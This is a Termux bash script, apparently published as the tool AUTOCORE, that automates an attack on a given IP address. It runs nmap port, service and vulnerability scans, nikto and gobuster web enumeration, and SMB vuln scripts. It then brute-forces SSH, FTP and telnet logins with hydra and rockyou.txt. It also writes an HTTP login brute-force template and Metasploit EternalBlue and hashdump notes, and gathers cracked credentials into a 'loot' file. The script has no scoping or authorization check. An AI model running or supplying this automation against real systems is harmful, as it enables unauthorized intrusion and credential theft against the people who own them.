#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
#  Tool    : AUTOCORE
#  Author  : Ch Manan (OBLIQ_CORE)
#  Handle  : cynex
#  GitHub  : https://github.com/Abdul-Manan-C
#  Version : 1.0
#  Platform: Termux (Android, No Root)
# ============================================================

RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'
YELLOW='\033[1;33m'; MAGENTA='\033[0;35m'; BLUE='\033[0;34m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'; BOLD='\033[1m'

banner() {
echo -e "${RED}"
cat << 'EOF'
  ▄▄▄       █    ██ ▄▄▄█████▓ ▒█████   ▄████▄   ▒█████   ██▀███  ▓█████
 ▒████▄     ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▓█   ▀
 ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒███
 ░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒▓█  ▄
  ▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░ ████▓▒░▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▒
  ▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░
   ▒   ▒▒ ░░░▒░ ░ ░     ░      ░ ▒ ▒░   ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░
   ░   ▒    ░░░ ░ ░   ░      ░ ░ ░ ▒  ░        ░ ░ ░ ▒    ░░   ░    ░
       ░  ░   ░                  ░ ░  ░ ░          ░ ░     ░        ░  ░
EOF
echo -e "${RESET}"
echo -e "${CYAN}${BOLD}         [ AUTOCORE v1.0 | Automated Pentest Orchestrator | Termux ]${RESET}"
echo -e "${DIM}         Author: Ch Manan (OBLIQ_CORE) | cynex | github.com/Abdul-Manan-C${RESET}\n"
}

section() {
    echo -e "\n${CYAN}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${CYAN}║${RESET}  ${WHITE}${BOLD}PHASE $1 — $2${RESET}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════╝${RESET}"
}

ok()   { echo -e "  ${GREEN}✔${RESET}  $1"; }
err()  { echo -e "  ${RED}✘${RESET}  $1"; }
warn() { echo -e "  ${YELLOW}!${RESET}  $1"; }
run()  { echo -e "  ${MAGENTA}>>${RESET} $1"; }
save() { echo -e "  ${BLUE}💾${RESET} Saved: $1"; }

check_tool() { command -v "$1" &>/dev/null; }

WORDLIST_DIR="$HOME/wordlists"
WORDLIST_DIRS="$WORDLIST_DIR/common.txt"
WORDLIST_PASS="$WORDLIST_DIR/rockyou.txt"
WORDLIST_USER="$WORDLIST_DIR/unix_users.txt"

# ─── Setup ────────────────────────────────────────────────
setup() {
    section "S" "AUTOCORE SETUP — TERMUX"
    ok "Updating packages..."
    pkg update -y && pkg upgrade -y

    TOOLS=(nmap hydra curl wget nikto)
    for t in "${TOOLS[@]}"; do
        if check_tool "$t"; then
            ok "$t already installed"
        else
            run "Installing $t..."
            pkg install -y "$t"  && ok "$t installed" || warn "Failed to install $t"
        fi
    done

    # Install gobuster via go
    if ! check_tool gobuster; then
        pkg install -y golang 
        go install github.com/OJ/gobuster/v3@latest  && ok "gobuster installed" || warn "gobuster install failed"
    fi

    # Wordlists
    mkdir -p "$WORDLIST_DIR"
    if [[ ! -f "$WORDLIST_DIRS" ]]; then
        run "Downloading common.txt wordlist..."
        wget -q "https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt" -O "$WORDLIST_DIRS" && ok "common.txt downloaded" || warn "Failed to download wordlist"
    fi
    if [[ ! -f "$WORDLIST_PASS" ]]; then
        run "Downloading rockyou.txt (compressed)..."
        wget -q "https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz" -O "${WORDLIST_PASS}.gz"  \
            && gunzip "${WORDLIST_PASS}.gz" && ok "rockyou.txt ready" || warn "rockyou download failed"
    fi
    if [[ ! -f "$WORDLIST_USER" ]]; then
        printf "root\nadmin\nuser\ntest\nguest\nftp\nwww\npi\n" > "$WORDLIST_USER"
        ok "unix_users.txt created"
    fi

    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${GREEN}║${RESET}  ${GREEN}✔${RESET}  ${WHITE}${BOLD}SETUP COMPLETE${RESET}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════╝${RESET}"
    exit 0
}

usage() {
    echo -e "${WHITE}Usage:${RESET}"
    echo -e "  autocore <IP>           — Full auto scan"
    echo -e "  autocore <IP> --web     — Web phase only"
    echo -e "  autocore <IP> --smb     — SMB phase only"
    echo -e "  autocore <IP> --brute   — Brute force phase only"
    echo -e "  autocore <IP> --full    — All phases"
    echo -e "  autocore <IP> --stealth — Slow/quiet scan"
    echo -e "  autocore --setup        — Install tools & wordlists"
    exit 0
}

[[ "$1" == "--setup" ]] && banner && setup
[[ $# -lt 1 ]] && banner && usage

TARGET="$1"; MODE="${2:---full}"
if [[ "$TARGET" == -* ]]; then
    banner
    usage
fi
banner

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SESSION="autocore_${TARGET}_${TIMESTAMP}"
mkdir -p "$SESSION"/{nmap,web,nikto,smb,hydra,metasploit,whatweb,enum,loot}
ok "Session: $SESSION"
echo -e "  ${DIM}Mode: $MODE | Target: $TARGET | Platform: Termux (No Root)${RESET}\n"

OPEN_PORTS=""
HAS_WEB=false; HAS_SMB=false; HAS_SSH=false; HAS_FTP=false; HAS_TELNET=false

phase_recon() {
    section 1 "RECON — WHOIS / DNS / PING"
    RECON_FILE="$SESSION/enum/recon.txt"
    {
        echo "=== PING ===" && ping -c 3 "$TARGET" 
        echo -e "\n=== HOST ===" && check_tool host && host "$TARGET" 
        echo -e "\n=== NSLOOKUP ===" && check_tool nslookup && nslookup "$TARGET" 
    } | tee "$RECON_FILE"
    save "$RECON_FILE"
}

phase_nmap() {
    section 2 "NMAP — PORT & SERVICE SCAN"
    warn "Using TCP connect scan (-sT) — no root on Termux"

    nmap -sT -T4 --top-ports 1000 "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt" 
    save "$SESSION/nmap/nmap_1_quick.txt"

    nmap -sT -T4 -p- "$TARGET" -oN "$SESSION/nmap/nmap_2_fullports.txt" 
    save "$SESSION/nmap/nmap_2_fullports.txt"

    OPEN_PORTS=$(grep "^[0-9]" "$SESSION/nmap/nmap_2_fullports.txt"  | grep "open" | awk -F/ '{print $1}' | tr '\n' ',')
    ok "Open ports: $OPEN_PORTS"

    if [[ -n "$OPEN_PORTS" ]]; then
        nmap -sT -sV -sC -p"${OPEN_PORTS}" "$TARGET" -oN "$SESSION/nmap/nmap_3_services.txt" 
        save "$SESSION/nmap/nmap_3_services.txt"
        nmap --script vuln -p"${OPEN_PORTS}" "$TARGET" -oN "$SESSION/nmap/nmap_4_vulns.txt" 
        save "$SESSION/nmap/nmap_4_vulns.txt"
    fi

    grep -q "80/open\|443/open\|8080/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_WEB=true
    grep -q "445/open\|139/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_SMB=true
    grep -q "22/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_SSH=true
    grep -q "21/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_FTP=true
    grep -q "23/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_TELNET=true
}

phase_web() {
    section 3 "WEB — ENUM / DIRECTORY / HEADERS"
    [[ "$HAS_WEB" != true ]] && warn "No web detected — skipping" && return

    PROTO="http"; grep -q "443/open" "$SESSION/nmap/nmap_2_fullports.txt"  && PROTO="https"
    URL="${PROTO}://${TARGET}"

    if check_tool nikto; then
        nikto -h "$URL" -o "$SESSION/nikto/nikto_1.txt" 
        save "$SESSION/nikto/nikto_1.txt"
    else
        warn "nikto not found"
    fi

    if check_tool gobuster && [[ -f "$WORDLIST_DIRS" ]]; then
        gobuster dir -u "$URL" -w "$WORDLIST_DIRS" -o "$SESSION/web/gobuster_1_dirs.txt" 
        save "$SESSION/web/gobuster_1_dirs.txt"
        gobuster dir -u "$URL" -w "$WORDLIST_DIRS" -x php,txt,html -o "$SESSION/web/gobuster_2_files.txt" 
        save "$SESSION/web/gobuster_2_files.txt"
    else
        warn "gobuster or wordlist missing"
    fi

    curl -skI "$URL"  | tee "$SESSION/web/headers_1.txt"; save "$SESSION/web/headers_1.txt"
    curl -sk "${URL}/robots.txt"  | tee "$SESSION/web/robots_1.txt"; save "$SESSION/web/robots_1.txt"
    curl -sk "${URL}/sitemap.xml"  | tee "$SESSION/web/sitemap_1.txt"; save "$SESSION/web/sitemap_1.txt"
}

phase_smb() {
    section 4 "SMB — NMAP SCRIPTS (Termux limited)"
    [[ "$HAS_SMB" != true ]] && warn "No SMB detected — skipping" && return
    warn "enum4linux/smbclient not available in Termux — using Nmap scripts only"
    nmap -p 445,139 --script smb-vuln*,smb-enum* "$TARGET" -oN "$SESSION/smb/nmap_smb_scripts.txt" 
    save "$SESSION/smb/nmap_smb_scripts.txt"
}

phase_brute() {
    section 5 "BRUTE FORCE — HYDRA"
    [[ -f "$WORDLIST_PASS" ]] || { warn "rockyou.txt not found — skipping"; return; }
    check_tool hydra || { warn "hydra not installed"; return; }

    [[ "$HAS_SSH" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" ssh -o "$SESSION/hydra/hydra_1_ssh.txt"  && save "$SESSION/hydra/hydra_1_ssh.txt"
    [[ "$HAS_FTP" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" ftp -o "$SESSION/hydra/hydra_2_ftp.txt"  && save "$SESSION/hydra/hydra_2_ftp.txt"
    [[ "$HAS_TELNET" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" telnet -o "$SESSION/hydra/hydra_3_telnet.txt"  && save "$SESSION/hydra/hydra_3_telnet.txt"

    cat > "$SESSION/hydra/hydra_4_http_template.txt" << EOF
# HTTP Brute Template — Edit and run manually
# hydra -L users.txt -P rockyou.txt $TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
EOF
    save "$SESSION/hydra/hydra_4_http_template.txt"
}

phase_msf() {
    section 6 "METASPLOIT — NOTES"
    warn "Metasploit not available in Termux — generating notes only"
    cat > "$SESSION/metasploit/metasploit_notes.txt" << EOF
# AUTOCORE — Metasploit Notes for $TARGET
# Run these on a machine with Metasploit installed (Kali/PC)

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET
set LHOST <your_ip>
run

search eternalblue
search type:exploit platform:linux
use post/linux/gather/hashdump
EOF
    save "$SESSION/metasploit/metasploit_notes.txt"
}

phase_report() {
    section 7 "FINAL REPORT"
    REPORT_FILE="$SESSION/REPORT_${TARGET}.txt"
    LOOT_FILE="$SESSION/loot/loot_summary.txt"
    CREDS=$(grep -r "login:" "$SESSION/hydra/"  | grep -v template | head -10)
    VULNS=$(grep -i "VULNERABLE\|CVE" "$SESSION/nmap/nmap_4_vulns.txt"  | head -10)
    {
        echo "AUTOCORE PENTEST REPORT"
        echo "Target : $TARGET | Session : $SESSION | Date : $(date)"
        echo "Open Ports: $OPEN_PORTS"
        echo "Creds: ${CREDS:-None found}"
        echo "Vulns: ${VULNS:-None detected}"
        echo "Files:"; find "$SESSION" -type f | sort
    } | tee "$REPORT_FILE" "$LOOT_FILE"
    save "$REPORT_FILE"

    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${GREEN}║${RESET}  ${GREEN}✔${RESET}  ${WHITE}${BOLD}AUTOCORE COMPLETE${RESET}"
    echo -e "${GREEN}╠══════════════════════════════════════════════════════╣${RESET}"
    echo -e "${GREEN}║${RESET}  ${DIM}Session : $SESSION${RESET}"
    echo -e "${GREEN}║${RESET}  ${DIM}Report  : $REPORT_FILE${RESET}"
    echo -e "${GREEN}║${RESET}  ${DIM}Loot    : $LOOT_FILE${RESET}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════╝${RESET}"
}

case "$MODE" in
    --web)    phase_recon; phase_nmap; phase_web ;;
    --smb)    phase_recon; phase_nmap; phase_smb ;;
    --brute)  phase_recon; phase_nmap; phase_brute ;;
    --stealth)
        phase_recon
        nmap -sT -T2 -p- "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt" 
        phase_web; phase_smb; phase_brute; phase_msf; phase_report ;;
    *)        phase_recon; phase_nmap; phase_web; phase_smb; phase_brute; phase_msf; phase_report ;;
esac
